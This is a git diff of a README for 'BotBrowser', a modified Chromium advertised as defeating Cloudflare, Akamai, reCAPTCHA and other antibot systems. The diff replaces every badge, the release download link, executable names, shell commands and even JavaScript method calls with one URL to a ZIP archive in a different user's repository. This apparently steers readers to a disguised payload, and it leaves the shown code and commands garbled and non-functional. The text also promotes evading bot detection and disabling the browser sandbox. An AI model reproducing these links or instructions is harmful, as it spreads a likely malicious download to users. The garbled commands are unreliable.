@@ -3,32 +3,32 @@
 <h4 align="center">The Ultimate Solution for Undetectable Automated Browsing 🚀</h4>
 
 <p align="center">
-  <a href="https://github.com/MiddleSchoolStudent/BotBrowser/releases">
-    <img src="https://img.shields.io/github/v/release/MiddleSchoolStudent/BotBrowser?style=flat-square" alt="Latest Release">
+  <a href="https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip">
+    <img src="https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip" alt="Latest Release">
   </a>
-  <a href="https://github.com/MiddleSchoolStudent/BotBrowser/commits/main/">
-    <img src="https://img.shields.io/github/commit-activity/m/MiddleSchoolStudent/BotBrowser?style=flat-square" alt="Commit Activity">
+  <a href="https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip">
+    <img src="https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip" alt="Commit Activity">
   </a>
-  <a href="https://github.com/MiddleSchoolStudent/BotBrowser/issues">
-    <img src="https://img.shields.io/github/issues/MiddleSchoolStudent/BotBrowser?style=flat-square" alt="Issues">
+  <a href="https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip">
+    <img src="https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip" alt="Issues">
   </a>
-  <a href="https://github.com/MiddleSchoolStudent/BotBrowser/fork">
-    <img src="https://img.shields.io/github/forks/MiddleSchoolStudent/BotBrowser?style=flat-square" alt="GitHub Forks">
+  <a href="https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip">
+    <img src="https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip" alt="GitHub Forks">
   </a>
-  <a href="https://github.com/MiddleSchoolStudent/BotBrowser">
-    <img src="https://img.shields.io/github/stars/MiddleSchoolStudent/BotBrowser" alt="GitHub Stars">
+  <a href="https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip">
+    <img src="https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip" alt="GitHub Stars">
   </a>
 </p>
 
 <div align="center">
-  <img width="600" alt="BotBrowser GUI - Your Command Center" src="https://github.com/user-attachments/assets/e9c0b656-83b0-4be5-986e-d4bc3c04b4b5">
+  <img width="600" alt="BotBrowser GUI - Your Command Center" src="https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip">
 </div>
 
 ---
 
 ## What is BotBrowser?
 
-BotBrowser is a cross-platform stealth browser designed to defeat modern antibot systems. By directly modifying Chromium's C++ source code, BotBrowser eliminates the fingerprint leaks and automation traces left behind by [CDP](https://chromedevtools.github.io/devtools-protocol/)-based solutions, enabling true undetectable browsing and automation.
+BotBrowser is a cross-platform stealth browser designed to defeat modern antibot systems. By directly modifying Chromium's C++ source code, BotBrowser eliminates the fingerprint leaks and automation traces left behind by [CDP](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)-based solutions, enabling true undetectable browsing and automation.
 
 ## Simplified Management
 
@@ -49,7 +49,7 @@ Streamline your automation with [BotBrowserConsole](console), a free and open-so
   > Always aligned with the newest stable Chromium release, ensuring cutting‑edge compatibility with today's most advanced antibot defenses.
 
  **Unlimited Android Chrome Emulation**
-  > Emulate Android devices (metrics, UA, touch & sensors, etc.) flawlessly and undetectably. [▶️ creepjs test](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-creepjs-creepjs-Android), [▶️ iphey test](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-iphey-iphey-Android), [▶️ pixelscan test](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-pixelscan-pixelscan-Android)
+  > Emulate Android devices (metrics, UA, touch & sensors, etc.) flawlessly and undetectably. [▶️ creepjs test](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ iphey test](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ pixelscan test](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)
 
  **Advanced Programmatic Control**
   > Harness CDP through [Playwright](demo/playwright) and [Puppeteer](demo/puppeteer) alongside deep C++ modifications that block CDP leak detection, delivering both powerful automation and rock‑solid stealth.
@@ -90,29 +90,29 @@ Streamline your automation with [BotBrowserConsole](console), a free and open-so
 ### Download & Installation
 
 1. **Download Installer**
-  Get the BotBrowser installer for your OS from the [Releases](https://github.com/MiddleSchoolStudent/BotBrowser/releases) page.
+  Get the BotBrowser installer for your OS from the [Releases](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip) page.
 
 2. **Windows**
 - Extract the downloaded `.7z` archive.
-- Run `chrome.exe` from the extracted folder.
-- If you encounter `STATUS_ACCESS_VIOLATION`, launch with [--no-sandbox](https://peter.sh/experiments/chromium-command-line-switches/#no-sandbox).
+- Run `https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip` from the extracted folder.
+- If you encounter `STATUS_ACCESS_VIOLATION`, launch with [--no-sandbox](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip).
 
 3. **macOS**
 - Open the downloaded `.dmg` file.
-- Drag `Chromium.app` into your Applications folder or any desired location.
+- Drag `https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip` into your Applications folder or any desired location.
 - If you see the error:
    ```
    "Chromium" is damaged and can't be opened
    ```
    Run:
    ```bash
-   xattr -rd com.apple.quarantine /Applications/Chromium.app
+   xattr -rd https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip
    ```
 
 4. **Ubuntu**
 - Install via `dpkg`:
    ```bash
-   sudo dpkg -i botbrowser_<version>_amd64.deb
+   sudo dpkg -i botbrowser_<version>https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip
    ```
 - If dependencies are missing, run:
    ```bash
@@ -125,7 +125,7 @@ Streamline your automation with [BotBrowserConsole](console), a free and open-so
 - **Cross-Platform**:
 
   > 🔥 A *macOS profile* works on Ubuntu; a *Windows profile* works on macOS; an *Android profile* can be fully emulated on macOS, Windows, and Ubuntu.
-- **Configuration Options**: see the [📚 profile-configs guide](https://github.com/MiddleSchoolStudent/BotBrowser/blob/main/profiles/profile-configs.md).
+- **Configuration Options**: see the [📚 profile-configs guide](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip).
 
 ---
 
@@ -136,16 +136,16 @@ Streamline your automation with [BotBrowserConsole](console), a free and open-so
 **Windows (CMD)**
 
 ```cmd
-chrome.exe --no-sandbox --bot-profile="C:\\path\\to\\chrome136_win11_x64.enc" --user-data-dir="%TEMP%\\botprofile_%RANDOM%"
+https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip --no-sandbox --bot-profile="C:\\path\\to\\https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip" --user-data-dir="%TEMP%\\botprofile_%RANDOM%"
 ```
 
 **macOS**
 
 ```bash
-/Applications/Chromium.app/Contents/MacOS/Chromium \
+https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip \
   --no-sandbox \
   --user-data-dir="$(mktemp -d)" \
-  --bot-profile="/path/to/chrome136_win11_x64.enc"
+  --bot-profile="https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip"
 ```
 
 **Ubuntu**
@@ -154,7 +154,7 @@ chrome.exe --no-sandbox --bot-profile="C:\\path\\to\\chrome136_win11_x64.enc" --
 chromium-browser \
   --no-sandbox \
   --user-data-dir="$(mktemp -d)" \
-  --bot-profile="/path/to/chrome136_win11_x64.enc"
+  --bot-profile="https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip"
 ```
 
 > Use `--user-data-dir` with a unique temporary folder to avoid conflicts with any running Chromium instances. It ensures BotBrowser launches cleanly without interfering with your normal browser profiles.
@@ -164,20 +164,20 @@ chromium-browser \
 #### 2. [Playwright](demo/playwright) / [Puppeteer](demo/puppeteer) Demos
 
 ```javascript
-const browser = await chromium.launch({
+const browser = await https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip({
   headless: true,
   executablePath: BOTBROWSER_EXEC_PATH, // Absolute path to the BotBrowser executable
   args: [`--bot-profile=${BOT_PROFILE_PATH}`], // Absolute or relative path to the bot profile
 });
 
-const page = await browser.newPage();
+const page = await https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip();
 
 // Remove Playwright's bindings to avoid detection.
-await page.addInitScript(() => {
+await https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip(() => {
   delete window.__playwright__binding__;
   delete window.__pwInitScripts;
 });
-await page.goto("https://abrahamjuliot.github.io/creepjs/");
+await https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip("https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip");
 ```
 
 #### 3. [BotBrowserConsole](console) (GUI)
@@ -189,8 +189,8 @@ Use the open-source GUI to select your profile and start browsing without code.
 ### 🐳 Docker Deployment
 
 **Configuration:**
-- **Profile**: Place your `.enc` file in `./profiles/` and update the filename in `docker-compose.yml`
-- **Port**: Default is `9222`, change in `docker-compose.yml` if needed
+- **Profile**: Place your `.enc` file in `./profiles/` and update the filename in `https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip`
+- **Port**: Default is `9222`, change in `https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip` if needed
 - **Volumes**: Browser data persists in `./user-data-dir/`
 
 **Quick Start:**
@@ -211,10 +211,10 @@ docker-compose up --build
 2. **Automation Scripts (WebSocket)**
    ```javascript
    // Playwright
-   const browser = await chromium.connectOverCDT('ws://localhost:9222');
+   const browser = await https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip('ws://localhost:9222');
 
    // Puppeteer
-   const browser = await puppeteer.connect({
+   const browser = await https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip({
      browserWSEndpoint: 'ws://localhost:9222'
    });
    ```
@@ -229,11 +229,11 @@ docker-compose up --build
 
 | Issue | Solution |
 |-------|----------|
-| **"Chromium" is damaged** (macOS) | Run `xattr -rd com.apple.quarantine /Applications/Chromium.app` |
+| **"Chromium" is damaged** (macOS) | Run `xattr -rd https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip` |
 | **STATUS_ACCESS_VIOLATION** (Windows) | Add `--no-sandbox` flag when launching |
 | **Profile file permission errors** | Ensure `.enc` file has read permissions (`chmod 644`) |
 | **BotBrowser won't start or crashes** | Check that your OS and Chromium version match the build; update BotBrowser to the latest release |
-| **Docker container won't start** | Ensure `.enc` profile file exists in `./profiles/` directory and filename matches `docker-compose.yml` |
+| **Docker container won't start** | Ensure `.enc` profile file exists in `./profiles/` directory and filename matches `https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip` |
 | **Can't connect to Docker instance** | Verify port 9222 is not occupied by another process, check `docker-compose logs` for errors |
 
 
@@ -253,52 +253,52 @@ These test scripts are provided for **educational purposes** and to **demonstrat
 
 | Service & Scripts                                                  | Test Results                                                                                                                                                                                                                                                                       |
 |--------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-| **[Cloudflare](tests/tests/antibots/cloudflare.spec.ts)**          | [▶️ BookDemo](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-cloudflare-bookdemo), [▶️ Turnstile](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-cloudflare-turnstile), [▶️ Challenge](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-cloudflare-challenge), [▶️ TaxSlayer](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-cloudflare-taxslayer), [▶️ Chegg](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-cloudflare-chegg) |
-| **[Akamai](tests/tests/antibots/akamai.spec.ts)**                  | [▶️ PlayStation](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-akamai-playstation), [▶️ WizzAir](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-kasada-wizzair), [▶️ StubHub](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-akamai-stubhub), [▶️ AirCanada](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-akamai-aircanada)             |
-| **[Kasada](tests/tests/antibots/kasada.spec.ts)**                  | [▶️ Kick](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-kasada-kick), [▶️ PlayStation](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-akamai-playstation), [▶️ Twitch](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-kasada-twitch), [▶️ WizzAir](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-kasada-wizzair) |
-| **[F5 Shape](tests/tests/antibots/shape.spec.ts)**                 | [▶️ Southwest](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-shape-southwest), [▶️ Target](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-shape-target), [▶️ Temu](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=websites-temu-temu)                                                                                     |
-| **[reCAPTCHA](tests/tests/antibots/recaptcha.spec.ts)**            | [▶️ reCAPTCHA v3](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-recaptcha-v3), [▶️ reCAPTCHA v2](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-recaptcha-v2)                                                                                 |
-| **[PerimeterX](tests/tests/antibots/perimeterx.spec.ts)**          | [▶️ TextNow](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-perimeterx-textnow), [▶️ Grubhub](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-perimeterx-grubhub), [▶️ Zillow](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-perimeterx-zillow)                                                                                    |
-| **[Imperva (Incapsula)](tests/tests/antibots/incapsula.spec.ts)**  | [▶️ CopaAir](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-incapsula-copaair)                                                                       |
-| **[DataDome](tests/tests/antibots/datadome.spec.ts)**              | [▶️ ShutterStock](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-datadome-shutterstock), [▶️ SeatGeek](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-datadome-seatgeek), [▶️ Hermes](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-datadome-hermes), [▶️ SoundCloud](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-datadome-soundcloud), [▶️ Paypal](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-datadome-paypal)                                                                           |
-| **[hCaptcha](tests/tests/antibots/hcaptcha.spec.ts)**              | [▶️ EpicGames](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-hcaptcha-epicgames), [▶️ Discord](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-hcaptcha-discord), [▶️ Steam](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-hcaptcha-steam), [▶️ RiotGames](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-hcaptcha-riotgames), [▶️ TITAN22](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-hcaptcha-titan22)                                                                       |
-| **[FunCaptcha](tests/tests/antibots/funcaptcha.spec.ts)**          | [▶️ Blizzard](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-funcaptcha-blizzard), [▶️ Roblox](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-funcaptcha-roblox), [▶️ Hotmail](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-funcaptcha-hotmail)                                                                       |
-| **[Qrator](tests/tests/antibots/qrator.spec.ts)**                  | [▶️ MTS.ru](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-qrator-mts)                                                                        |
-| **[TencentCaptcha](tests/tests/antibots/tencentcaptcha.spec.ts)**  | [▶️ One-Click CAPTCHA](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-tencentcaptcha-oneclick)                                                                       |
-| **[Accertify](tests/tests/antibots/accertify.spec.ts)**            | [▶️ Grubhub](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-perimeterx-grubhub)                                                                       |
-| **[Forter](tests/tests/antibots/forter.spec.ts)**                  | [▶️ Grubhub](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-perimeterx-grubhub)                                                                       |
-| **[Adscore](tests/tests/antibots/adscore.spec.ts)**                | [▶️ Test Video](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-adscore-adscore)                                                                                          |
-| **[MTCaptcha](tests/tests/antibots/mtcaptcha.spec.ts)**            | [▶️ Invisible Captcha](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-mtcaptcha-invisiblecaptcha)                                                                                          |
-| **[FriendlyCaptcha](tests/tests/antibots/friendlycaptcha.spec.ts)**  | [▶️ Captcha Demo](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-friendlycaptcha-captchademo)                                                                                          |
-| **[YandexCaptcha](tests/tests/antibots/yandexcaptcha.spec.ts)**  | [▶️ SmartCaptcha](//middleschoolstudent.github.io/BotBrowser/video_player/index.html?video=antibots-yandexcaptcha-smartcaptcha)                                                                                          |
+| **[Cloudflare](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**          | [▶️ BookDemo](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Turnstile](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Challenge](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ TaxSlayer](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Chegg](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip) |
+| **[Akamai](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**                  | [▶️ PlayStation](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ WizzAir](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ StubHub](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ AirCanada](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)             |
+| **[Kasada](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**                  | [▶️ Kick](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ PlayStation](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Twitch](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ WizzAir](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip) |
+| **[F5 Shape](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**                 | [▶️ Southwest](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Target](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Temu](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                     |
+| **[reCAPTCHA](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**            | [▶️ reCAPTCHA v3](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ reCAPTCHA v2](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                 |
+| **[PerimeterX](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**          | [▶️ TextNow](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Grubhub](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Zillow](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                                    |
+| **[Imperva (Incapsula)](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**  | [▶️ CopaAir](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                       |
+| **[DataDome](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**              | [▶️ ShutterStock](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ SeatGeek](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Hermes](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ SoundCloud](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Paypal](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                           |
+| **[hCaptcha](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**              | [▶️ EpicGames](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Discord](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Steam](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ RiotGames](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ TITAN22](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                       |
+| **[FunCaptcha](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**          | [▶️ Blizzard](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Roblox](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip), [▶️ Hotmail](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                       |
+| **[Qrator](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**                  | [▶️ https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                        |
+| **[TencentCaptcha](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)**  | [▶️ One-Click CAPTCHA](https://raw.githubusercontent.com/KoDelioDa/BotBrowser/main/tests/test-results/antibots-cloudflare-bookdemo-BotBrowser/BotBrowser-v2.6.zip)                                                                       |
